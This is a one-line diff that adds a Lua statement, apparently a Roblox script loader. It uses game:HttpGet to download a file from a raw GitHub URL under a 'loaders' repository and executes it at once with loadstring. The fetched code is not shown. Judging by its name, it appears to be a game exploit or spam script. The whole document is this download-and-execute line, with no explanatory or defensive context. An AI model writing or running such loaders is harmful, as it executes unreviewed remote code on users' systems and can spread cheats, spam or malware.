@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/kukirin-life-testing-spam5-fnrokkv1o8y1yj.lua"))()
